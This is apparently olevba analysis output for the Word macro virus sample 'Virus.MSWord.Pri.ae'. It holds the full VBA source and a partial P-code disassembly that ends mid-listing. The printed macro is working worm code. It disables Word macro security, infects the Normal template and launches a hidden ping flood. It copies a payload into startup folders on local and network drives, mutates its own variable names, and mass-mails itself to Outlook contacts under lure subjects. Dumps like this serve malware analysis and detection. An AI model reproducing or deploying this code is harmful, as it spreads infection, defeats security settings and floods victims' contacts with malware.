olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'This Word XP virus was created using NWXPG
'code by Necronomikon/[Zer0Gravity]
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
Application.AutomationSecurity = msoAutomationSecurityForceDisable
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security       AccessVBOM") = 1&
win = Environ("windir")
docz = win & "\re.doc"
UnKqCqLm = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VhPrFhRz = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "pri" Then
Set JyVwHqMr = ActiveDocument.VBProject.VBComponents.Item(1)
RfPsJgNf = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "pri" Then
Set JyVwHqMr = NormalTemplate.VBProject.VBComponents.Item(1)
CyOhDjJq = True
ActiveDocument.Saved = True
End If
If GetAttr(ActiveDocument.FullName) = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If CyOhDjJq <> True And RfPsJgNf <> True Then GoTo EtRnErSz
EtRnErSz:
If VhPrFhRz <> 0 And UnKqCqLm = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
SetAttr ActiveDocument.FullName, 1
ActiveDocument.Saved = True: End If
OurCode = NPE(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines))
Shell " ping -l 50000 -t http://www.microsoft.com/", vbHide '""

Call network
End Sub
Sub infect(drive)
On Error Resume Next
Dim s, f
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile("c:\WINDOWS\necro.mp3")
f.Copy (drive & "\pussy.com")
f.Copy (drive & "\windows\startm~1\programs\startup\msdos.com")
End Sub
Function ShowDriveType(drvpath)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
If t = "" Then t = "None"
ShowDriveType = t
End Function
Sub network()
On Error Resume Next
Dim n, l, d3, drv
For n = 65 To 90
l = Chr(n)
drv = l & ":"
d3 = ShowDriveType(drv)
If d3 = "Fixed" Then infect (drv)
If d3 = "Network" Then infect (drv)
Next n
End Sub
Sub AutoClose()
On Error Resume Next
Rem taken from Word97/2K/XP.Tijor by Ultras[MATRiX]
Dim win, packIt
win = Environ("windir")
packIt = UUEncode(win & "\re.doc", win & "\" & "" & Application.UserName & "" & ".uue")
Set OutlookApp = CreateObject("Outlook.Application")
Set MAPIuz = OutlookApp.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\nwxpg\", "nwxpg") <> "by Necronomikon[Zerogravity]" Then
If OutlookApp = "Outlook" Then
MAPIuz.Logon "profile", "password"
For Address = 1 To MAPIuz.AddressLists.Count
Set AddyBook = MAPIuz.AddressLists(Address)
countz = 1
Set Guan0utlook = OutlookApp.CreateItem(0)
For mmez = 1 To AddyBook.AddressEntries.Count
AddBZ = AddyBook.AddressEntries(countz)
Guan0utlook.Recipients.Add AddBZ
countz = countz + 1
If countz > 30 Then oo = AddyBook.AddressEntries.Count
Next mmez
Randomize
numberz = Int(Rnd * 9) + 1
If numberz = 1 Then mez$ = "Read this..."
If numberz = 2 Then mez$ = "" & Application.UserName & " :)"
If numberz = 3 Then mez$ = "Unpack it."
If numberz = 4 Then mez$ = "New story"
If numberz = 5 Then mez$ = "Re:"
If numberz = 6 Then mez$ = "Important Info"
If numberz = 7 Then mez$ = "This is interesting..."
If numberz = 8 Then mez$ = "Look what I found..."
If numberz = 9 Then mez$ = "Check this out..."
Guan0utlook.Subject = mez$
Guan0utlook.Body = mez$
Guan0utlook.Attachments.Add win & "\" & "" & Application.UserName & "" & ".uue"
Guan0utlook.Send
AddBZ = ""
Next Address
MAPIuz.Logoff
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\nwxpg\", "nwxpg") <> "by Necronomikon[Zerogravity]" Then
End If
End Sub
Function Encode(sDa As String) As String
Dim szOut As String
Dim nChar As Integer
Dim i As Integer
If Len(sDa) Mod 3 <> 0 Then sDa = sDa & Space(3 - Len(sDa) Mod 3)
For i = 1 To Len(sDa) Step 3
szOut = szOut & Chr(Asc(Mid(sDa, i, 1)) \ 4 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i, 1)) Mod 4) * 16 + Asc(Mid(sDa, i + 1, 1)) \ 16 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i + 1, 1)) Mod 16) * 4 + Asc(Mid(sDa, i + 2, 1)) \ 64 + 32)
szOut = szOut & Chr(Asc(Mid(sDa, i + 2, 1)) Mod 64 + 32)
Next i
Encode = szOut
End Function
Function UUEncode(fileIn As String, fileOut As String) As Integer
Dim nFi As Integer, nFo As Integer
Dim indx As Integer, sDa As String
Dim lbytei As Long, lfull As Long, lmaxl As Long
On Error GoTo ERR_UUEncode
nFi = FreeFile
Open fileIn For Binary As nFi
lbytei = LOF(nFi)
nFo = FreeFile
Open fileOut For Output As nFo
For indx = Len(fileIn) - 1 To 1 Step -1
If Mid$(fileIn, indx, 1) = "\" Then
fileIn = Mid$(fileIn, indx + 1)
Exit For
End If
Next
Print #nFo, "begin 644 " & fileIn
lfull = lbytei \ 45
sDa = Space(45)
While lfull > 0
Get nFi, , sDa
Print #nFo, "M" & Encode(sDa)
lfull = lfull - 1
DoEvents
Wend
sDa = Space(lbytei Mod 45)
Get nFi, , sDa
Print #nFo, Chr(Len(sDa) + 32) & Encode(sDa)
Print #nFo, "end"
Close nFi
Close nFo
ERR_UUEncode:
Close nFi
Close nFo
Exit Function
End Function
Private Function NPE(poly)
Rem Necronomikon's Polymorph Engine
Dim VaR(6): On Error Resume Next: Randomize
VaR(1) = "poly": VaR(2) = "NPE": VaR(3) = "VaR": VaR(4) = "nec"
VaR(5) = "morph": VaR(6) = "NewVar"
For nec = 1 To 6
nec_nec = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
While InStr(1, poly, VaR(nec), vbTextCompare)
morph = InStr(1, poly, VaR(nec), vbTextCompare)
poly = Mid(poly, 1, morph - 1) & NewVar & Mid(poly, morph + Len(VaR(nec)), Len(poly) - morph)
Wend
Next
NPE = poly
End Function


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.ae
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12924 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x002A "This Word XP virus was created using NWXPG"
' Line #3:
' 	QuoteRem 0x0000 0x0022 "code by Necronomikon/[Zer0Gravity]"
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0002 
' Line #6:
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0002 
' 	LitDI4 0x0001 0x0000 
' 	Ne 
' 	IfBlock 
' Line #7:
' 	Ld msoAutomationSecurityForceDisable 
' 	Ld Application 
' 	MemSt AutomationSecurity 
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security       AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0001 
' Line #9:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St win 
' Line #10:
' 	Ld win 
' 	LitStr 0x0007 "\re.doc"
' 	Concat 
' 	St docz 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St UnKqCqLm 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VhPrFhRz 
' Line #13:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "pri"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JyVwHqMr 
' Line #15:
' 	LitVarSpecial (True)
' 	St RfPsJgNf 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "pri"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set JyVwHqMr 
' Line #19:
' 	LitVarSpecial (True)
' 	St CyOhDjJq 
' Line #20:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #24:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld CyOhDjJq 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld RfPsJgNf 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo EtRnErSz 
' 	EndIf 
' Line #27:
' 	Label EtRnErSz 
' Line #28:
' 	Ld VhPrFhRz 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld UnKqCqLm 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' Line #32:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #33:
' 	LineCont 0x0004 15 00 00 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd NPE 0x0001 
' 	St OurCode 
' Line #34:
' 	LitStr 0x002B " ping -l 50000 -t http://www.microsoft.com/"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' 	QuoteRem 0x003C 0x0002 """"
' Line #35:
' Line #36:
' 	ArgsCall (Call) network 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub infect(drive))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim 
' 	VarDefn s
' 	VarDefn False
' Line #41:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set s 
' Line #42:
' 	SetStmt 
' 	LitStr 0x0014 "c:\WINDOWS\necro.mp3"
' 	Ld s 
' 	ArgsMemLd GetFile 0x0001 
' 	Set False 
' Line #43:
' 	Ld drive 
' 	LitStr 0x000A "\pussy.com"
' 	Concat 
' 	Paren 
' 	Ld False 
' 	ArgsMemCall Copy 0x0001 
' Line #44:
' 	Ld drive 
' 	LitStr 0x002C "\windows\startm~1\programs\startup\msdos.com"
' 	Concat 
' 	Paren 
' 	Ld False 
' 	ArgsMemCall Copy 0x0001 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Function ShowDriveType(drvpath, id_FFFE As Variant))
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	Dim 
' 	VarDefn fso
' 	VarDefn d
' 	VarDefn t
' Line #49:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' Line #50:
' 	SetStmt 
' 	Ld drvpath 
' 	Ld fso 
' 	ArgsMemLd GetDrive 0x0001 
' 	Set d 
' Line #51:
' 	Ld d 
' 	MemLd DriveType 
' 	SelectCase 
' Line #52:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Unknown"
' 	St t 
' Line #53:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "Removable"
' 	St t 
' Line #54:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Fixed"
' 	St t 
' Line #55:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "Network"
' 	St t 
' Line #56:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CD-ROM"
' 	St t 
' Line #57:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 "RAM Disk"
' 	St t 
' Line #58:
' 	EndSelect 
' Line #59:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "None"
' 	St t 
' 	EndIf 
' Line #60:
' 	Ld t 
' 	St ShowDriveType 
' Line #61:
' 	EndFunc 
' Line #62:
' 	FuncDefn (Sub network())
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	Dim 
' 	VarDefn n
' 	VarDefn l
' 	VarDefn d3
' 	VarDefn drv
' Line #65:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0041 
' 	LitDI2 0x005A 
' 	For 
' Line #66:
' 	Ld n 
' 	ArgsLd Chr 0x0001 
' 	St l 
' Line #67:
' 	Ld l 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St drv 
' Line #68:
' 	Ld drv 
' 	ArgsLd ShowDriveType 0x0001 
' 	St d3 
' Line #69:
' 	Ld d3 
' 	LitStr 0x0005 "Fixed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld drv 
' 	Paren 
' 	ArgsCall infect 0x0001 
' 	EndIf 
' Line #70:
' 	Ld d3 
' 	LitStr 0x0007 "Network"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld drv 
' 	Paren 
' 	ArgsCall infect 0x0001 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub AutoClose())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	Rem 0x0030 " taken from Word97/2K/XP.Tijor by Ultras[MATRiX]"
' Line #76:
' 	Dim 
' 	VarDefn win
' 	VarDefn packIt
' Line #77:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St win 
' Line #78:
' 	Ld win 
' 	LitStr 0x0007 "\re.doc"
' 	Concat 
' 	Ld win 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitStr 0x0004 ".uue"
' 	Concat 
' 	ArgsLd UUEncode 0x0002 
' 	St packIt 
' Line #79:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set OutlookApp 
' Line #80:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld OutlookApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set MAPIuz 
' Line #81:
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CURRENT_USER\Software\nwxpg\"
' 	LitStr 0x0005 "nwxpg"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001C "by Necronomikon[Zerogravity]"
' 	Ne 
' 	IfBlock 
' Line #82:
' 	Ld OutlookApp 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #83:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld MAPIuz 
' 	ArgsMemCall Logon 0x0002 
' Line #84:
' 	StartForVariable 
' 	Ld Address 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MAPIuz 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #85:
' 	SetStmt 
' 	Ld Address 
' 	Ld MAPIuz 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #86:
' 	LitDI2 0x0001 
' 	St countz 
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld OutlookApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Guan0utlook 
' Line #88:
' 	StartForVariable 
' 	Ld mmez 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #89:
' 	Ld countz 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St AddBZ 
' Line #90:
' 	Ld AddBZ 
' 	Ld Guan0utlook 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #91:
' 	Ld countz 
' 	LitDI2 0x0001 
' 	Add 
' 	St countz 
' Line #92:
' 	Ld countz 
' 	LitDI2 0x001E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #93:
' 	StartForVariable 
' 	Ld mmez 
' 	EndForVariable 
' 	NextVar 
' Line #94:
' 	ArgsCall Read 0x0000 
' Line #95:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St numberz 
' Line #96:
' 	Ld numberz 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Read this..."
' 	St mez$ 
' 	EndIf 
' Line #97:
' 	Ld numberz 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0003 " :)"
' 	Concat 
' 	St mez$ 
' 	EndIf 
' Line #98:
' 	Ld numberz 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "Unpack it."
' 	St mez$ 
' 	EndIf 
' Line #99:
' 	Ld numberz 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "New story"
' 	St mez$ 
' 	EndIf 
' Line #100:
' 	Ld numberz 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Re:"
' 	St mez$ 
' 	EndIf 
' Line #101:
' 	Ld numberz 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Important Info"
' 	St mez$ 
' 	EndIf 
' Line #102:
' 	Ld numberz 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "This is interesting..."
' 	St mez$ 
' 	EndIf 
' Line #103:
' 	Ld numberz 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Look what I found..."
' 	St mez$ 
' 	EndIf 
' Line #104:
' 	Ld numberz 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "Check this out..."
' 	St mez$ 
' 	EndIf 
' Line #105:
' 	Ld mez$ 
' 	Ld Guan0utlook 
' 	MemSt Subject 
' Line #106:
' 	Ld mez$ 
' 	Ld Guan0utlook 
' 	MemSt Body 
' Line #107:
' 	Ld win 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitStr 0x0004 ".uue"
' 	Concat 
' 	Ld Guan0utlook 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #108:
' 	Ld Guan0utlook 
' 	ArgsMemCall Send 0x0000 
' Line #109:
' 	LitStr 0x0000 ""
' 	St AddBZ 
' Line #110:
' 	StartForVariable 
' 	Ld Address 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	Ld MAPIuz 
' 	ArgsMemCall Logoff 0x0000 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CURRENT_USER\Software\nwxpg\"
' 	LitStr 0x0005 "nwxpg"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001C "by Necronomikon[Zerogravity]"
' 	Ne 
' 	IfBlock 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Function Encode(sDa As String, id_FFFE As String) As String)
' Line #117:
' 	Dim 
' 	VarDefn szOut (As String)
' Line #118:
' 	Dim 
' 	VarDefn nChar (As Integer)
' Line #119:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #120:
' 	Ld sDa 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Mod 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sDa 
' 	LitDI2 0x0003 
' 	Ld sDa 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Mod 
' 	Sub 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	St sDa 
' 	EndIf 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sDa 
' 	FnLen 
' 	LitDI2 0x0003 
' 	ForStep 
' Line #122:
' 	Ld szOut 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0004 
' 	IDiv 
' 	LitDI2 0x0020 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St szOut 
' Line #123:
' 	Ld szOut 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0010 
' 	Mul 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0010 
' 	IDiv 
' 	Add 
' 	LitDI2 0x0020 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St szOut 
' Line #124:
' 	Ld szOut 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0010 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mul 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0040 
' 	IDiv 
' 	Add 
' 	LitDI2 0x0020 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St szOut 
' Line #125:
' 	Ld szOut 
' 	Ld sDa 
' 	Ld i 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0040 
' 	Mod 
' 	LitDI2 0x0020 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St szOut 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	Ld szOut 
' 	St Encode 
' Line #128:
' 	EndFunc 
' Line #129:
' 	FuncDefn (Function UUEncode(fileIn As String, fileOut As String, id_FFFE As Integer) As Integer)
' Line #130:
' 	Dim 
' 	VarDefn nFi (As Integer)
' 	VarDefn nFo (As Integer)
' Line #131:
' 	Dim 
' 	VarDefn indx (As Integer)
' 	VarDefn sDa (As String)
' Line #132:
' 	Dim 
' 	VarDefn lbytei (As Long)
' 	VarDefn lfull (As Long)
' 	VarDefn lmaxl (As Long)
' Line #133:
' 	OnError ERR_UUEncode 
' Line #134:
' 	Ld Friend 
' 	St nFi 
' Line #135:
' 	Ld fileIn 
' 	Ld nFi 
' 	LitDefault 
' 	Open (For Binary)
' Line #136:
' 	Ld nFi 
' 	ArgsLd LOF 0x0001 
' 	St lbytei 
' Line #137:
' 	Ld Friend 
' 	St nFo 
' Line #138:
' 	Ld fileOut 
' 	Ld nFo 
' 	LitDefault 
' 	Open (For Output)
' Line #139:
' 	StartForVariable 
' 	Ld indx 
' 	EndForVariable 
' 	Ld fileIn 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #140:
' 	Ld fileIn 
' 	Ld indx 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld fileIn 
' 	Ld indx 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St fileIn 
' Line #142:
' 	ExitFor 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	StartForVariable 
' 	Next 
' Line #145:
' 	Ld nFo 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "begin 644 "
' 	Ld fileIn 
' 	Concat 
' 	PrintItemNL 
' Line #146:
' 	Ld lbytei 
' 	LitDI2 0x002D 
